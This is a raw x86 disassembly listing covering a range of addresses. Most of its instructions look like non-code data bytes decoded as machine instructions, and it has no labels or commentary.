  421d07:	add    al,BYTE PTR [esi+0x2]
  421d0a:	add    eax,DWORD PTR [eax]
  421d0c:	add    al,BYTE PTR ss:[ecx]
  421d0f:	add    BYTE PTR [esi],bh
  421d11:	add    al,BYTE PTR [ebx]
  421d13:	add    BYTE PTR [esi],bh
  421d15:	jmp    0x202:0xea3e0200
  421d1c:	add    al,BYTE PTR ss:[ebx]
  421d1f:	add    BYTE PTR [esi],dh
  421d21:	cli    
  421d22:	add    BYTE PTR [eax],al
  421d24:	inc    esi
  421d25:	add    al,BYTE PTR [ebx]
  421d27:	add    BYTE PTR [esi],bh
  421d29:	add    al,BYTE PTR [ecx]
  421d2b:	add    BYTE PTR [esi],bh
  421d2d:	cli    
  421d2e:	add    BYTE PTR [edx],al
  421d30:	ss cli 
  421d32:	add    al,BYTE PTR [eax]
  421d34:	inc    esi
  421d35:	add    al,BYTE PTR [ecx]
  421d37:	add    bh,BYTE PTR [esi]
  421d39:	add    al,BYTE PTR [ecx]
  421d3b:	add    BYTE PTR [esi],dh
  421d3d:	cli    
  421d3e:	add    al,BYTE PTR [edx]
  421d40:	ss cli 
  421d42:	add    BYTE PTR [eax],al
  421d44:	ds pop ebx
  421d46:	out    dx,eax
  421d47:	add    eax,0x5e75b3c
  421d4c:	cmp    al,0x5b
  421d4e:	fild   WORD PTR [ebx]
  421d50:	ds arpl di,sp
  421d53:	add    edi,DWORD PTR [ebx+eiz*2]
  421d56:	out    dx,eax
  421d57:	add    eax,0x0
	...
  421d80:	add    BYTE PTR [eax],al
  421d82:	ds arpl di,bp
  421d85:	add    eax,0x3e75b3e
  421d8a:	cmp    al,0x63
  421d8c:	fild   WORD PTR ds:0x3ef5b3c
  421d92:	ds pop ebx
  421d94:	out    dx,eax
  421d95:	add    edi,DWORD PTR [ebx+eiz*2]
  421d98:	out    0x5,eax
  421d9a:	cmp    al,0x5b
  421d9c:	call   0x689ddbc4
  421da1:	and    edi,DWORD PTR [esi]
  421da3:	pop    ebx
  421da4:	push   0x675b3e23
  421da9:	add    edi,DWORD PTR [esi]
  421dab:	pop    ebx
  421dac:	and    edi,DWORD PTR [bp+0x685a]
  421db1:	add    edi,DWORD PTR [esi-0x41fc17a6]
  421db7:	pop    edx
  421db8:	call   0xe79d5be0
  421dbd:	add    edi,DWORD PTR [esi]
  421dbf:	pop    ebx
  421dc0:	out    0x23,eax
  421dc2:	mov    esi,0xbe23e75a
  421dc7:	pop    edx
  421dc8:	push   0x685abe23
  421dcd:	add    edi,DWORD PTR [esi]
  421dcf:	pop    ebx
  421dd0:	out    0x3,eax
  421dd2:	ds pop ebx
  421dd4:	addr16 add al,0xbe
  421dd7:	pop    edx
  421dd8:	call   0xe89cdbe0
  421ddd:	add    edi,DWORD PTR [esi]
  421ddf:	pop    ebx
  421de0:	out    0x23,eax
  421de2:	ds pop ebx
  421de4:	out    0x3,eax
	...
  421e0e:	add    BYTE PTR [eax],al
  421e10:	mov    esi,0x1de8005a
  421e15:	(bad)  
  421e17:	push   0xe9005b42
  421e1c:	cmp    eax,0x5de7ffdb
  421e21:	pop    ebx
  421e22:	add    BYTE PTR [ecx+0x5a],ch
  421e25:	pop    ebx
  421e26:	add    BYTE PTR [eax+0x42],ch
  421e29:	(bad)  
  421e2b:	out    0x3d,eax
  421e2d:	pop    ebx
  421e2e:	add    BYTE PTR [ecx+0x62],ch
  421e31:	pop    ebx
  421e32:	add    BYTE PTR [ecx+0x3a],ch
  421e35:	(bad)  
  421e37:	call   0x69427959
  421e3c:	sbb    bl,bl
  421e3e:	jmp    DWORD PTR [edi+0x22]
  421e41:	(bad)  
  421e43:	cmp    bl,BYTE PTR [bp+di+0x0]
  421e47:	imul   eax,DWORD PTR [edx-0x25],0xdb3de7ff
  421e4e:	(bad)  
  421e4f:	call   0x6841f971
  421e54:	sbb    bl,bl
  421e56:	jmp    DWORD PTR [edi+0x42]
  421e59:	pop    ebx
  421e5a:	add    cl,ch
  421e5c:	cmp    eax,0x3de9005b
  421e61:	pop    ebx
  421e62:	add    cl,ch
  421e64:	pop    ebp
  421e65:	(bad)  
  421e67:	push   0x69005b62
  421e6c:	cmp    bl,bl
  421e6e:	jmp    DWORD PTR [edi+0x42]
  421e71:	(bad)  
  421e73:	out    0x0,eax
	...
  421e9d:	add    BYTE PTR ds:0x1de8005b,bh
  421ea3:	(bad)  
  421ea5:	addr16 sbb eax,0x1d68005b
  421eab:	pop    ebx
  421eac:	add    BYTE PTR [ecx+0x3d],ch
  421eaf:	pop    ebx
  421eb0:	add    BYTE PTR [eax+0x1d],ch
  421eb3:	(bad)  
  421eb5:	jmp    DWORD PTR [esi+0x5a]
  421eb8:	add    BYTE PTR [eax],al
  421eba:	(bad)  
  421ebb:	pop    edx
  421ebc:	add    BYTE PTR [eax],al
  421ebe:	xlat   BYTE PTR ds:[ebx]
  421ebf:	cmp    al,BYTE PTR [eax]
  421ec1:	add    BYTE PTR [esi-0x59ff7fa6],ah
  421ec7:	cmp    al,BYTE PTR [eax]
  421ec9:	add    BYTE PTR [edi],dl
  421ecb:	cmp    al,BYTE PTR [eax-0x7fa5ea00]
  421ed1:	add    BYTE PTR [esi+0x2700003a],ah
  421ed7:	cmp    al,BYTE PTR [eax]
  421ed9:	add    BYTE PTR [edi-0x69ff7fa6],dl
  421edf:	cmp    al,BYTE PTR [eax+0x59e700]
  421ee5:	add    BYTE PTR [edi+0x5a],ah
  421ee8:	add    BYTE PTR [eax],0x57
  421eeb:	cmp    al,BYTE PTR [eax]
  421eed:	add    bh,dl
  421eef:	cmp    DWORD PTR [eax+0x576700],eax
  421ef5:	add    BYTE PTR [edi+0x57],ah
  421ef8:	or     BYTE PTR [edx],al
  421efa:	push   edi
  421efb:	pop    edx
  421efc:	or     BYTE PTR [edx],al
  421efe:	push   edi
  421eff:	push   edi
  421f00:	add    BYTE PTR [edx+0x0],al
	...
  421f2b:	add    BYTE PTR [edi],ah
  421f2d:	pop    edx
  421f2e:	or     BYTE PTR [eax],al
  421f30:	daa    
  421f31:	push   edi
  421f32:	add    BYTE PTR [eax],al
  421f34:	pop    ss
  421f35:	pop    edx
  421f36:	add    BYTE PTR [eax+0x17],al
  421f39:	pop    edx
  421f3a:	or     BYTE PTR [edx],al
  421f3c:	daa    
  421f3d:	push   edi
  421f3e:	or     BYTE PTR [eax+0x27],al
  421f41:	pop    edx
  421f42:	or     BYTE PTR [eax],al
  421f44:	pop    ss
  421f45:	push   edi
  421f46:	add    BYTE PTR [edx],al
  421f48:	pop    ss
  421f49:	push   edi
  421f4a:	or     BYTE PTR [eax-0x19],al
  421f4d:	push   esi
  421f4e:	add    BYTE PTR [edx-0x19],al
  421f51:	pop    ecx
  421f52:	or     BYTE PTR [edx-0x29],al
  421f55:	pop    eax
  421f56:	or     BYTE PTR [eax],al
  421f58:	ds add al,0x1
  421f5b:	add    BYTE PTR [esi+0x4],bh
  421f5e:	add    DWORD PTR [eax],eax
  421f60:	cmp    al,0x4
  421f62:	add    DWORD PTR [eax],ecx
  421f64:	jle    0x421f6a
  421f66:	add    DWORD PTR [eax],ecx
  421f68:	jle    0x421f6e
  421f6a:	add    DWORD PTR [eax],eax
  421f6c:	ds add al,0x2
  421f6f:	add    dh,bh
  421f71:	add    eax,DWORD PTR [edx]
  421f73:	or     ah,bh
  421f75:	add    eax,DWORD PTR [edx]
  421f77:	or     ah,bh
  421f79:	add    eax,DWORD PTR [edx]
  421f7b:	add    BYTE PTR [esp+eax*1],bh
  421f7e:	add    DWORD PTR [eax],ecx
  421f80:	cld    
  421f81:	add    eax,DWORD PTR [edx]
  421f83:	add    dh,bh
  421f85:	add    eax,DWORD PTR [ecx]
  421f87:	add    BYTE PTR [esi],bh
  421f89:	add    al,0x1
  421f8b:	add    ah,bh
  421f8d:	add    eax,DWORD PTR [edx]
  421f8f:	or     BYTE PTR [eax],al
	...
  421fb9:	add    BYTE PTR [esp+eax*1],bh
  421fbc:	add    DWORD PTR [eax],eax
  421fbe:	cmp    al,0x4
  421fc0:	add    DWORD PTR [eax],eax
  421fc2:	cld    
  421fc3:	add    eax,DWORD PTR [edx]
  421fc5:	or     BYTE PTR [esi],bh
  421fc7:	add    al,0x1
  421fc9:	or     BYTE PTR [esi],bh
  421fcb:	add    al,0x2
  421fcd:	add    ah,bh
  421fcf:	add    eax,DWORD PTR [edx]
  421fd1:	add    BYTE PTR [esi],bh
  421fd3:	add    al,0x1
  421fd5:	add    BYTE PTR [edx+eax*1],bh
  421fd8:	add    DWORD PTR [eax],eax
  421fda:	jle    0x421fde
  421fdc:	add    DWORD PTR [eax],ecx
  421fde:	cmp    al,0x2
  421fe0:	add    al,BYTE PTR [eax]
  421fe2:	jl     0x421fe6
  421fe4:	add    cl,BYTE PTR [eax]
  421fe6:	jle    0x421fea
  421fe8:	add    al,BYTE PTR [eax]
  421fea:	cmp    al,0x2
  421fec:	add    DWORD PTR [eax],eax
  421fee:	jle    0x421ff2
  421ff0:	add    DWORD PTR [eax],ecx
  421ff2:	jl     0x421ff6
  421ff4:	add    cl,BYTE PTR [eax]
  421ff6:	cmp    al,0x2
  421ff8:	add    cl,BYTE PTR [eax]
  421ffa:	jle    0x422057
  421ffc:	out    0x2,eax
  421ffe:	ds pop ebx
  422000:	out    0x3,eax
  422002:	ds pop ecx
  422004:	out    0x3,eax
  422006:	inc    esi
  422007:	cdq    
  422008:	out    0x2,eax
  42200a:	inc    esi
  42200b:	cdq    
  42200c:	out    0x2,eax
  42200e:	ss pop ebx
  422010:	out    0x3,eax
  422012:	ds cdq 
  422014:	out    0x2,eax
  422016:	inc    esi
  422017:	cdq    
  422018:	out    0x3,eax
  42201a:	inc    esi
  42201b:	pop    ecx
  42201c:	out    0x3,eax
	...
  422046:	add    BYTE PTR [eax],al
  422048:	ds pop ebx
  42204a:	out    0x3,eax
  42204c:	ss fwait
  42204e:	out    0x3,eax
  422050:	ds cdq 
  422052:	out    0x2,eax
  422054:	inc    esi
  422055:	pop    ebx
  422056:	out    0x2,eax
  422058:	ds pop ecx
  42205a:	out    0x2,eax
  42205c:	ds fwait
  42205e:	out    0x3,eax
  422060:	inc    esi
  422061:	pop    ebx
  422062:	out    0x3,eax
  422064:	ds pop ebx
  422066:	out    0x3,eax
  422068:	ss fwait
  42206a:	out    0x2,eax
  42206c:	ss pop ecx
  42206e:	out    0x2,eax
  422070:	ds fwait
  422072:	test   DWORD PTR [ebx],0x3e73b3e
  422078:	(bad)  
  422079:	cmp    ah,bh
  42207b:	ret    
  42207c:	inc    ecx
  42207d:	in     al,dx
  42207e:	(bad)  
  42207f:	ret    
  422080:	jns    0x4220bd
  422082:	out    0x3,eax
  422084:	jle    0x4220c1
  422086:	test   DWORD PTR [ebx],0xc3f75b3e
  42208c:	popa   
  42208d:	cmp    esp,edi
  42208f:	add    edi,DWORD PTR [esi+0x5b]
  422092:	out    0xc3,eax
  422094:	adc    DWORD PTR [edi+edx*8-0x3d],ecx
  422098:	dec    ecx
  422099:	pop    ebx
  42209a:	out    0x3,eax
  42209c:	jle    0x4220f9
  42209e:	add    cl,bl
  4220a0:	cmp    eax,0x3dd9205b
  4220a5:	fwait
  4220a6:	add    cl,ch
  4220a8:	std    
  4220a9:	jmp    0x4220c7
  4220ab:	jmp    0x4220b0
	...
  4220d4:	add    BYTE PTR [eax],al
  4220d6:	cmp    eax,0xfdf9205b
  4220db:	jmp    0x4220d9
  4220dd:	jmp    0xd9427c1f
  4220e2:	cmp    eax,0xfdd9009b
  4220e7:	jmp    0x422105
  4220e9:	jmp    0xea3f0c6b
  4220ee:	jge    0x42211b
  4220f0:	add    cl,bh
  4220f2:	jge    0x4220df
  4220f4:	sbb    al,0xf9
  4220f6:	cmp    eax,0x3df9005b
  4220fb:	fwait
  4220fc:	and    cl,bh
  4220fe:	cmp    eax,0x3de9209b
  422103:	pop    ebx
  422104:	add    cl,bl
  422106:	jge    0x422133
  422108:	add    cl,ch
  42210a:	jge    0x422137
  42210c:	and    cl,bl
  42210e:	jge    0x4220fb
  422110:	cld    
  422111:	jmp    0xe9424c93
  422116:	jge    0x422143
  422118:	and    cl,ch
  42211a:	cmp    eax,0x7de9205b
  42211f:	jmp    0x42213d
  422121:	fnstcw WORD PTR ds:0x3dd9005b
  422127:	fwait
  422128:	and    cl,ch
  42212a:	std    
  42212b:	sub    al,BYTE PTR [eax]
  42212d:	fscale 
  42212f:	sub    ah,BYTE PTR [eax]
  422131:	jmp    0xf942bc73
  422136:	std    
  422137:	jmp    0x0:0xf9fc
	...
  422162:	add    BYTE PTR [eax],al
  422164:	cmp    eax,0x3de9205b
  422169:	fwait
  42216a:	add    BYTE PTR [eax],al
  42216c:	pop    ss
  42216d:	pop    ds
  42216e:	std    
  42216f:	pop    ds
  422170:	pop    ss
  422171:	pop    edi
  422172:	add    BYTE PTR [eax],ah
  422174:	pop    ss
  422175:	pop    ds
  422176:	std    
  422177:	call   DWORD PTR [edi]
  422179:	pop    edi
  42217a:	add    BYTE PTR [eax],ah
  42217c:	out    0x1e,eax
  42217e:	cmp    eax,0x3d1ed720
  422183:	add    bh,ah
  422185:	pop    esi
  422186:	inc    eax
  422187:	and    bh,dl
  422189:	push   ds
  42218a:	cmp    eax,0x3d1ed700
  42218f:	and    bh,dl
  422191:	pop    esi
  422192:	add    BYTE PTR [eax],al
  422194:	xchg   edi,eax
  422195:	pop    esi
  422196:	inc    eax
  422197:	and    BYTE PTR [edi-0x68ffffa2],dl
  42219d:	push   ds
  42219e:	std    
  42219f:	call   DWORD PTR [edi-0x68dfbfa2]
  4221a5:	push   ds
  4221a6:	cmp    eax,0xfd1ea700
  4221ab:	jmp    DWORD PTR [edi+0x5e]
  4221ae:	inc    eax
  4221af:	add    BYTE PTR [edi+0x1e],ah
  4221b2:	std    
  4221b3:	pop    ds
  4221b4:	addr16 pop esi
  4221b6:	add    BYTE PTR [eax],al
  4221b8:	addr16 push ds
  4221ba:	cmp    eax,0x5e5720
  4221bf:	and    BYTE PTR [edi+0x5e],ah
  4221c2:	inc    eax
  4221c3:	add    BYTE PTR [edi+0x1e],dl
  4221c6:	std    
  4221c7:	pop    ds
	...
  4221f0:	add    BYTE PTR [eax],al
  4221f2:	addr16 pop esi
  4221f4:	and    BYTE PTR [eax],al
  4221f6:	push   ebp
  4221f7:	pop    esi
  4221f8:	and    BYTE PTR [edx*2+0x2703fce6],al
  4221ff:	pop    esi
  422200:	add    BYTE PTR [eax],al
  422202:	daa    
  422203:	out    0xfc,al
  422205:	call   DWORD PTR ds:0x1503fce6
  42220b:	out    0x1c,al
  42220d:	add    BYTE PTR [esi],bh
  42220f:	hlt    
  422210:	clc    
  422211:	pop    ds
  422212:	cmp    dh,dh
  422214:	clc    
  422215:	pop    ds
  422216:	inc    edx
  422217:	hlt    
  422218:	add    BYTE PTR [eax],ah
  42221a:	ds hlt 
  42221c:	add    BYTE PTR [eax],al
  42221e:	test   BYTE PTR ds:[eax],0x0
  422222:	cmp    dh,dh
  422224:	add    BYTE PTR [eax],al
  422226:	ds hlt 
  422228:	add    BYTE PTR [eax],al
  42222a:	cmp    dh,dh
  42222c:	add    BYTE PTR [eax],ah
  42222e:	inc    edx
  42222f:	idiv   al
  422231:	call   ecx
  422233:	repz clc 
  422235:	(bad)  
  422236:	cmp    eax,0x3e1ff8f6
  42223b:	test   BYTE PTR [eax],0x20
  42223e:	ds hlt 
  422240:	clc    
  422241:	(bad)  
  422242:	cmp    eax,0x420000f6
  422247:	hlt    
  422248:	add    BYTE PTR [eax],ah
  42224a:	cmp    dh,ah
  42224c:	clc    
  42224d:	pop    ds
  42224e:	inc    edx
  42224f:	test   BYTE PTR [eax],0x20
  422252:	ds hlt 
  422254:	add    BYTE PTR [eax],ah
	...
  42227e:	add    BYTE PTR [eax],al
  422280:	inc    edx
  422281:	hlt    
  422282:	clc    
  422283:	inc    DWORD PTR [ecx+0x79fff8f5]
  422289:	cmc    
  42228a:	clc    
  42228b:	pop    ds
  42228c:	cmp    dh,ah
  42228e:	clc    
  42228f:	pop    ds
  422290:	test   BYTE PTR ds:[eax],0x0
  422294:	ds hlt 
  422296:	add    BYTE PTR [eax],al
  422298:	inc    edx
  422299:	hlt    
  42229a:	clc    
  42229b:	pop    ds
  42229c:	ds hlt 
  42229e:	add    BYTE PTR [eax],al
  4222a0:	inc    edx
  4222a1:	hlt    
  4222a2:	clc    
  4222a3:	pop    ds
  4222a4:	ds hlt 
  4222a6:	add    BYTE PTR [eax],ah
  4222a8:	ds hlt 
  4222aa:	clc    
  4222ab:	(bad)  
  4222ac:	cmp    eax,0x3dfff8f4
  4222b1:	pop    ebx
  4222b2:	jmp    0xe9a180ba
  4222b7:	add    ebx,DWORD PTR [esi+0x5f]
  4222ba:	jmp    0xe99d60c2
  4222bf:	add    ebx,DWORD PTR [esi+0x5b]
  4222c2:	out    0x3,eax
  4222c4:	ds pop edi
  4222c6:	out    0xfb,eax
  4222c8:	stc    
  4222c9:	pop    esp
  4222ca:	out    0x3,eax
  4222cc:	push   ds
  4222cd:	pop    ebx
  4222ce:	out    0xfb,eax
  4222d0:	dec    ecx
  4222d1:	pop    edi
  4222d2:	jmp    0xe92b04d2
  4222d7:	sti    
  4222d8:	cmp    DWORD PTR [ebx-0x19],ebx
  4222db:	sti    
  4222dc:	xor    DWORD PTR [edi-0x17],ebx
  4222df:	sti    
  4222e0:	leave  
  4222e1:	call   0x4226ce
	...
  42230e:	ds pop edi
  422310:	jmp    0xe7a17d10
  422315:	add    ebx,DWORD PTR [esi+0x5f]
  422318:	out    0xfb,eax
  42231a:	dec    ecx
  42231b:	pop    ebx
  42231c:	out    0x3,eax
  42231e:	ds pop ebx
  422320:	jmp    0xe99d6128
  422325:	sti    
  422326:	xor    DWORD PTR [edi-0x19],ebx
  422329:	add    edi,DWORD PTR [esi]
  42232b:	pop    ebx
  42232c:	jmp    0xe79d452c
  422331:	add    ebx,DWORD PTR [esi]
  422333:	pop    edi
  422334:	out    0xfb,eax
  422336:	jno    0x422320
  422338:	call   0xe7a16140
  42233d:	sti    
  42233e:	popa   
  42233f:	pop    esp
  422340:	out    0xfb,eax
  422342:	pop    ecx
  422343:	call   0x5b602730
  422348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422349:	repz dec ecx
  42234b:	pop    eax
  42234c:	out    0xf3,eax
  42234e:	inc    ecx
  42234f:	call   0x5b84273a
  422354:	add    BYTE PTR [ecx-0x16efa3d3],ch
  42235a:	cmp    eax,0x2da9105b
  42235f:	call   0x5b7fcc70
  422364:	add    cl,ch
  422366:	cmp    eax,0x3da9105b
  42236b:	pop    edi
  42236c:	add    cl,ch
  42236e:	cmp    eax,0xa9105f
	...
  42239b:	add    ch,ch
  42239d:	pop    ebx
  42239e:	adc    cl,ch
  4223a0:	in     eax,dx
  4223a1:	pop    ebx
  4223a2:	add    cl,ch
  4223a4:	in     eax,dx
  4223a5:	pop    ebx
  4223a6:	adc    BYTE PTR [ecx],ch
  4223a8:	jmp    0xfce7:0xcde9005b
  4223af:	sub    DWORD PTR [edx],edi
  4223b1:	pop    ebx
  4223b2:	add    cl,ch
  4223b4:	cmp    eax,0x3a29105f
  4223b9:	pop    ebx
  4223ba:	adc    cl,ch
  4223bc:	lods   eax,DWORD PTR ds:[esi]
  4223bd:	out    0xc,eax
  4223bf:	sub    DWORD PTR [edx-0x52160319],ebp
  4223c5:	pop    ebx
  4223c6:	add    BYTE PTR [ecx],ch
  4223c8:	cmp    bl,BYTE PTR [edi+0x0]
  4223cb:	sub    DWORD PTR [edx+0x5f],eax
  4223ce:	adc    cl,ch
  4223d0:	lea    ebx,[ebx+0x10]
  4223d3:	sub    DWORD PTR [edx+0x3de9fce7],edx
  4223d9:	pop    ebx
  4223da:	add    cl,ch
  4223dc:	cmp    eax,0x3a29005b
  4223e1:	pop    edi
  4223e2:	adc    BYTE PTR [ecx],ch
  4223e4:	inc    edx
  4223e5:	pop    ebx
  4223e6:	adc    cl,ch
  4223e8:	ins    DWORD PTR es:[edi],dx
  4223e9:	out    0xc,eax
  4223eb:	test   eax,0xe9005b4d
  4223f0:	cmp    eax,0x4da9005f
  4223f5:	pop    ebx
  4223f6:	add    BYTE PTR [eax],al
  4223f8:	push   edi
  4223f9:	pop    ebx
  4223fa:	add    al,0x0
  4223fc:	daa    
  4223fd:	jmp    0x4223ff
  4223ff:	adc    BYTE PTR [eax],al
	...
  422429:	add    BYTE PTR [edi],ah
  42242b:	jmp    0x422429
  42242d:	call   edi
  42242f:	pop    edx
  422430:	add    BYTE PTR [eax],al
  422432:	xlat   BYTE PTR ds:[ebx]
  422433:	pop    edx
  422434:	add    al,0x10
  422436:	daa    
  422437:	jmp    0x422435
  422439:	jmp    edi
  42243b:	jmp    0xffc:0xeb170000
  422442:	xlat   BYTE PTR ds:[ebx]
  422443:	pop    edx
  422444:	add    BYTE PTR [eax],al
  422446:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422447:	pop    edx
  422448:	add    BYTE PTR [eax],dl
  42244a:	out    0x5a,eax
  42244c:	add    al,0x10
  42244e:	xchg   edi,eax
  42244f:	pop    edx
  422450:	add    al,0x10
  422452:	xlat   BYTE PTR ds:[ebx]
  422453:	pop    edx
  422454:	add    BYTE PTR [eax],dl
  422456:	out    0x5a,eax
  422458:	add    al,0x0
  42245a:	daa    
  42245b:	out    dx,eax
  42245c:	cld    
  42245d:	(bad)  
  42245f:	pop    edx
  422460:	add    BYTE PTR [eax],al
  422462:	pop    ss
  422463:	out    dx,eax
  422464:	add    BYTE PTR [eax],dl
  422466:	addr16 pop edi
  422468:	add    al,0x0
  42246a:	addr16 pop edi
  42246c:	add    BYTE PTR [eax],dl
  42246e:	xchg   edi,eax
  42246f:	pop    edx
  422470:	add    al,0x10
  422472:	xchg   edi,eax
  422473:	jmp    0xffc:0xef670ffc
  42247a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42247b:	pop    edx
  42247c:	add    BYTE PTR [eax],al
  42247e:	push   edi
  42247f:	out    dx,eax
  422480:	add    BYTE PTR [eax],dl
  422482:	xchg   edi,eax
  422483:	jmp    0x0:0xea670000
  42248a:	daa    
  42248b:	out    dx,eax
  42248c:	cld    
  42248d:	inc    DWORD PTR [eax]
	...
  4224b7:	add    BYTE PTR [edi],dl
  4224b9:	out    dx,eax
  4224ba:	cld    
  4224bb:	call   DWORD PTR [edi+0x6700045a]
  4224c1:	pop    edx
  4224c2:	add    BYTE PTR [eax],dl
  4224c4:	ds hlt 
  4224c6:	lock add ebp,DWORD PTR [esi]
  4224c9:	push   0xf441fec6
  4224ce:	add    BYTE PTR [eax],al
  4224d0:	ds hlt 
  4224d2:	add    BYTE PTR [eax],al
  4224d4:	sbb    BYTE PTR ds:[ebx-0x1],bh
  4224d8:	sub    eax,edi
  4224da:	cmp    edi,0x21
  4224dd:	je     0x422460
  4224df:	call   FWORD PTR [ecx]
  4224e1:	hlt    
  4224e2:	add    BYTE PTR [eax],al
  4224e4:	ds hlt 
  4224e6:	add    BYTE PTR [eax],al
  4224e8:	ds pop esi
  4224ea:	jnp    0x4224eb
  4224ec:	add    DWORD PTR [edi+edi*2],eax
  4224ef:	(bad)  
  4224f0:	stc    
  4224f1:	xchg   DWORD PTR [ecx+0xf3f1ff],eax
  4224f7:	add    BYTE PTR [esi],bh
  4224f9:	hlt    
  4224fa:	add    BYTE PTR [eax],al
  4224fc:	add    BYTE PTR ds:[esi-0x1],bh
  422500:	fst    DWORD PTR [edi-0x7e]
  422503:	call   ecx
  422505:	xlat   BYTE PTR ds:[ebx]
  422506:	cmp    edi,0xffffffc9
  422509:	repz add BYTE PTR [eax],al
  42250c:	ds hlt 
  42250e:	add    BYTE PTR [eax],al
  422510:	ds mov ah,0x7a
  422513:	push   DWORD PTR [ecx-0x56008119]
  422519:	iret   
  42251a:	cmp    edi,0x0
	...
  422545:	add    BYTE PTR [ecx+0x3e0000f3],ah
  42254b:	hlt    
  42254c:	add    BYTE PTR [eax],al
  42254e:	ds scas al,BYTE PTR es:[edi]
  422550:	jp     0x422551
  422552:	mov    DWORD PTR [edi-0x7e],ebx
  422555:	inc    DWORD PTR [ecx+0x79ff83bf]
  42255b:	repz add BYTE PTR [eax],al
  42255e:	ds hlt 
  422560:	add    BYTE PTR [eax],al
  422562:	adc    BYTE PTR ds:[ecx-0x1],bh
  422566:	popa   
  422567:	pop    edx
  422568:	rol    DWORD PTR [ecx-0x7bb11aa7],cl
  42256e:	push   ecx
  42256f:	in     eax,0xe6
  422571:	add    edi,DWORD PTR [esi]
  422573:	pop    ebx
  422574:	out    0x3,eax
  422576:	ds pop ebx
  422578:	int    0x7b
  42257a:	cmp    ebp,esp
  42257c:	mov    esi,0xeae53181
  422581:	sub    BYTE PTR [ecx],0xe5
  422584:	out    0x3,al
  422586:	ds pop ebx
  422588:	out    0x3,eax
  42258a:	ds pop ebx
  42258c:	add    eax,0x7ae5117c
  422591:	or     BYTE PTR [ecx],0xe5
  422594:	(bad)  
  422595:	add    BYTE PTR [ecx],0xe5
  422598:	out    0x3,al
  42259a:	ds pop ebx
  42259c:	out    0x3,eax
  42259e:	ds pop ebx
  4225a0:	sar    DWORD PTR [edx-0x17],1
  4225a3:	in     al,0x26
  4225a5:	and    cl,0xe4
  4225a8:	out    0x3,al
	...
  4225d2:	add    BYTE PTR [eax],al
  4225d4:	ds pop ebx
  4225d6:	out    0x3,eax
  4225d8:	ds pop ebx
  4225da:	out    0x3,eax
  4225dc:	ds pop ebx
  4225de:	out    0x3,eax
  4225e0:	ds pop ebx
  4225e2:	out    0x3,eax
  4225e4:	ds pop ebx
  4225e6:	stos   DWORD PTR es:[edi],eax
  4225e7:	xor    DWORD PTR [ecx-0x567e6f1c],0xa181c4e4
  4225f1:	in     al,0x9a
  4225f3:	sbb    DWORD PTR [ecx-0x6e7f191c],0x8980e2e4
  4225fd:	in     al,0xf0
  4225ff:	add    BYTE PTR [ecx+0x7980d0e4],0xe4
  422606:	mov    ah,0x80
  422608:	jno    0x4225ee
  42260a:	jmp    FWORD PTR [edi+edi*4]
  42260d:	in     al,0xfc
  42260f:	sbb    DWORD PTR [edi-0x413a031c],edi
  422615:	in     al,0xfc
  422617:	fstp   TBYTE PTR [esi-0x4198031c]
  42261d:	in     al,0xfc
  42261f:	ins    DWORD PTR es:[edi],dx
  422620:	mov    esi,0xbe7bfce4
  422625:	jecxz  0x422623
  422627:	sub    edi,DWORD PTR [esi-0x41e2031d]
  42262d:	jecxz  0x42262b
  42262f:	inc    ebp
  422630:	mov    esi,0xbe1ffce3
  422635:	jecxz  0x422633
  422637:	out    0x0,eax
	...
  422661:	add    BYTE PTR [ecx-0x760c031c],dl
  422667:	in     al,0xfc
  422669:	rol    DWORD PTR [ecx+0x79c5fce4],0xe4
  422670:	cld    
  422671:	fwait
  422672:	jno    0x422658
  422674:	cld    
  422675:	mov    ebp,DWORD PTR [ecx-0x1c]
  422678:	cld    
  422679:	jg     0x4226dc
  42267b:	in     al,0xfc
  42267d:	jae    0x422645
  42267f:	jecxz  0x42267d
  422681:	jge    0x422649
  422683:	jecxz  0x422681
  422685:	xor    DWORD PTR [esi-0x496c031d],0xffffffe3
  42268c:	cld    
  42268d:	mov    ch,0xc6
  42268f:	jecxz  0x42268d
  422691:	mov    eax,ds:0xc1fce3c6
  422696:	mov    dh,0xe3
  422698:	cld    
  422699:	mov    ch,0xb6
  42269b:	jecxz  0x422699
  42269d:	icebp  
  42269e:	(bad)  
  42269f:	jecxz  0x42269d
  4226a1:	add    edi,eax
  4226a3:	jecxz  0x4226a1
  4226a5:	ret    
  4226a6:	mov    dh,0xe3
  4226a8:	cld    
  4226a9:	shl    DWORD PTR [esi+0x5500fce3],cl
  4226af:	sar    ah,cl
  4226b1:	inc    DWORD PTR [ecx-0x2e]
  4226b4:	cld    
  4226b5:	(bad)  
  4226b6:	(bad)  
  4226b8:	cld    
  4226b9:	(bad)  
  4226ba:	call   ecx
  4226bc:	cld    
  4226bd:	jmp    DWORD PTR [edi]
  4226bf:	sar    ah,cl
  4226c1:	(bad)  
  4226c2:	call   ecx
  4226c4:	cld    
  4226c5:	inc    DWORD PTR [eax]
	...
  4226ef:	add    bl,bh
  4226f1:	sar    esp,1
  4226f3:	(bad)  
  4226f4:	in     eax,dx
  4226f5:	sar    esp,1
  4226f7:	jmp    FWORD PTR ds:0x15fffcd5
  4226fd:	aad    0xfc
  4226ff:	(bad)  
  422700:	aas    
  422701:	aad    0xfc
  422703:	jmp    FWORD PTR [edi]
  422705:	aad    0xfc
  422707:	(bad)  
  422708:	jmp    0x284223e1
  42270d:	pop    edi
  42270e:	add    BYTE PTR [eax],al
  422710:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422711:	aam    0xfc
  422713:	call   FWORD PTR [ebp-0x7a00032b]
  422719:	aad    0xfc
  42271b:	push   DWORD PTR ds:0x15fffcd5
  422721:	aad    0xfc
  422723:	dec    DWORD PTR [ecx-0x2b]
  422726:	cld    
  422727:	jmp    edi
  422729:	pop    esi
  42272a:	add    BYTE PTR [eax],al
  42272c:	not    esp
  42272e:	cld    
  42272f:	call   edi
  422731:	pop    esi
  422732:	add    BYTE PTR [eax],al
  422734:	(bad)  
  422736:	cld    
  422737:	call   FWORD PTR [edi+0x43fffcd5]
  42273d:	(bad)  
  42273e:	cld    
  42273f:	jmp    FWORD PTR [ebp+0x5ffffcd5]
  422745:	(bad)  
  422746:	cld    
  422747:	(bad)  
  422748:	call   ebp
  42274a:	cld    
  42274b:	jmp    FWORD PTR [edi]
  42274d:	(bad)  
  42274e:	cld    
  42274f:	(bad)  
  422750:	ds dec esi
  422752:	mov    edi,edi
	...
  42277c:	add    BYTE PTR [eax],al
